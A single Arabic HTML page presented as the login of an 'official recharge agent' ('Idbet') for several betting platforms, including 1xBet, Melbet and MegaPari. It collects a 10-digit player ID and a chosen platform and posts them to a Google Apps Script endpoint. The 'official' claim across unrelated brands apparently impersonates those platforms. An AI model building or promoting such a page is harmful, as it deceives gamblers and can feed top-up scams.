<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>تسجيل الدخول</title>
<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
<style>
:root{--brand:#e50914}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Tajawal',sans-serif;direction:rtl;background:#f5f5f5;color:#333}
header{height:64px;background:#fff;display:flex;align-items:center;padding:0 20px;box-shadow:0 2px 6px rgba(0,0,0,.05)}
.header-brand{display:flex;gap:8px;align-items:center;font-weight:500}
.header-brand .id{color:var(--brand);font-weight:700}
main{display:flex;justify-content:center;padding:24px 12px}
.login-box{background:#fff;max-width:360px;width:100%;padding:24px 16px;border-radius:12px;box-shadow:0 4px 14px rgba(0,0,0,.08)}
.title{display:flex;align-items:center;gap:8px;font-size:1.15rem;font-weight:700;margin-bottom:16px}
.step{width:30px;height:30px;border-radius:50%;background:var(--brand);color:#fff;display:flex;align-items:center;justify-content:center;font-size:.9rem}
.label{margin-bottom:6px;font-weight:600;display:flex;gap:6px;font-size:.9rem}
.info{width:22px;height:22px;border:2px solid #666;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.9rem;cursor:help;color:#666;transition:.3s}
.info:hover{border-color:var(--brand);background:rgba(229,9,20,.1);color:var(--brand)}
input[type=text]{width:100%;padding:9px;font-size:.9rem;border:1px solid #ccc;border-radius:8px}
.error{font-size:.8rem;min-height:18px;margin-top:4px;transition:color .3s}
.icons{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:18px 0}
.icon{position:relative;border:1px solid #eee;border-radius:12px;padding:10px;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.05);cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:.25s}
.icon:hover{transform:translateY(-3px);box-shadow:0 5px 12px rgba(0,0,0,.08)}
.icon.selected{border-color:var(--brand);box-shadow:0 0 8px rgba(229,9,20,.3)}
.icon.selected::after{content:"✓";position:absolute;top:5px;left:5px;width:16px;height:16px;border-radius:50%;background:var(--brand);color:#fff;font-size:9px;display:flex;align-items:center;justify-content:center}
.icon img{height:38px;max-width:90%;object-fit:contain}
.icon-name{margin-top:5px;font-size:.75rem;font-weight:600;text-align:center}
button{width:100%;padding:9px;font-size:.95rem;border:none;border-radius:8px;background:var(--brand);color:#fff;font-weight:700;cursor:pointer;transition:.25s}
button:disabled{background:#ccc;cursor:not-allowed}
button:hover:not(:disabled){background:#b20710}
.spinner,.loader{display:inline-block;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle}
.spinner{width:15px;height:15px;border:3px solid rgba(255,255,255,.6);border-top:3px solid #fff;margin-right:5px}
.loader{width:12px;height:12px;border:2px solid var(--brand);border-top-color:transparent;margin-left:3px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>

<header>
  <div class="header-brand"><span class="id">Idbet</span><span>|</span><span>وكيل الشحن الرسمي</span></div>
</header>

<main>
  <section class="login-box">
    <div class="title"><div class="step">1</div><h2>تسجيل الدخول</h2></div>

    <div class="label"><label for="player-id">معرّف اللاعب</label><span class="info" title="رقم مكوَّن من 10 أرقام">؟</span></div>
    <input id="player-id" type="text" placeholder="أدخل المعرف الـ ID" maxlength="10">
    <div id="err" class="error"></div>

    <div id="platforms" class="icons">
      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png"><div class="icon-name">LineBet</div></div>
      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp"><div class="icon-name">MegaPari</div></div>
      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png"><div class="icon-name">Melbet</div></div>
      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg"><div class="icon-name">Gooobet</div></div>
      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png"><div class="icon-name">1xBet</div></div>
    </div>

    <button id="submit" disabled>تسجيل الدخول</button>
  </section>
</main>

<script>
/* ——— الإعدادات ——— */
const scriptURL = 'https://script.google.com/macros/s/AKfycbxoR2wAngLqoUBjy9N3kNgCt0pdlGEz6MDXnYAsY1ZubhadeoEPGnKJu7SoyMBdwsw/exec';
const repReg   = /^(\d)\1{9}$/;  // 10 أرقام متطابقة

/* ——— عناصر DOM ——— */
const input   = document.getElementById('player-id');
const errMsg  = document.getElementById('err');
const btn     = document.getElementById('submit');
const icons   = document.querySelectorAll('.icon');

let platform = null;

/* أرقام فقط */
input.addEventListener('keydown', e=>{
  const ok=['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
  if(!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
});
input.addEventListener('input', validate);

/* اختيار منصة */
icons.forEach(icon=>{
  icon.addEventListener('click',()=>{
    icons.forEach(i=>i.classList.remove('selected'));
    icon.classList.add('selected');
    platform = icon.dataset.name;
    validate();
  });
});

/* التحقق */
function validate(){
  const val = input.value.replace(/\D/g,''); input.value=val;
  let msg='', color='var(--brand)';

  if(!val)                 msg='أدخل الـ ID.';
  else if(val.length<10)   msg='<span class="loader"></span> تحقق…';
  else if(repReg.test(val))msg='غير مسموح بـ 10 أرقام متشابهة.';
  else if(!platform)       {msg='الـ ID صحيح، اختر المنصة.'; color='green';}

  errMsg.innerHTML = msg; errMsg.style.color = color;
  btn.disabled = !!msg && !msg.includes('loader');
}

/* الإرسال */
btn.addEventListener('click', async e=>{
  e.preventDefault();

  const userId = input.value.trim();
  if(userId.length!==10 || repReg.test(userId) || !platform){
    errMsg.textContent='يرجى إدخال ID صالح واختيار منصة.'; return;
  }

  btn.innerHTML='<span class="spinner"></span> جارٍ الإرسال…'; btn.disabled=true;

  try{
    const res  = await fetch(scriptURL,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ userId, platform })
    });
    const txt = await res.text();
    if(res.ok && /success|تم الحفظ/i.test(txt)) btn.textContent='✔ تم الحفظ';
    else throw new Error(txt);
  }catch(err){
    console.error(err);
    btn.textContent='خطأ في الإرسال';
    setTimeout(()=>{btn.textContent='تسجيل الدخول'; validate();},3000);
  }
});
</script>

</body>
</html>
